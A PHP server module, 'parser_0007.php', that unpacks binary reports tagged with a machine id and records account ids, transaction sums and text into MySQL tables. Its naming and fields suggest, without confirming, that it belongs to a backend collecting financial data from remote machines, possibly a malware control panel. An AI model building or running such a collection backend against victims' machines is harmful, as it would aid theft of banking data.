<?php
/*
    parser_0007.php

 */

define('sizeof_KIN', 2+4+4);

/* 
    main enter function. Returns FALSE in case of any errors
    Params passed:
    $m_id - numeric id identifying particular machine
    $mod_data - binary chunk to be parsed by this module
    $error - buffer to contain any error for logging in case of parse failure
 */ 
function Parser_id0007($m_id, $mod_data, &$error)
{
    global $g_dblink;
    
    // only one item assumed to be present for this type
    $item = unpack("vwLen/VdwRecordId/VdwTransSum", $mod_data);
    $info = mysqli_real_escape_string($g_dblink, substr($mod_data, sizeof_KIN));
    $info_hash = sha1($info);
    
    if (!mysqli_query($g_dblink, "INSERT INTO `t_accs_reg` (`cli_id`, `tacc_id`, `stamp`, `sum`, `info`, `info_hash`) VALUES ({$m_id}, {$item['dwRecordId']}, NOW(), {$item['dwTransSum']}, '{$info}', '{$info_hash}')
    ON DUPLICATE KEY UPDATE `dups` = `dups` + 1;")) 
    { $error = __FUNCTION__."(".__LINE__."): query1 failed: ".mysqli_error($g_dblink); return FALSE; }
    
    // update t-acc related fields
    if (!mysqli_query($g_dblink, "UPDATE `t_accs` SET `trans_count_registered` = `trans_count_registered` + 1, `trans_sum_registered` = `trans_sum_registered` + {$item['dwTransSum']} WHERE id = {$item['dwRecordId']} LIMIT 1;")) 
    { $error = __FUNCTION__."(".__LINE__."): query2 failed: ".mysqli_error($g_dblink); return FALSE; }
    
    // all ok if got here 
    return TRUE;
}
?>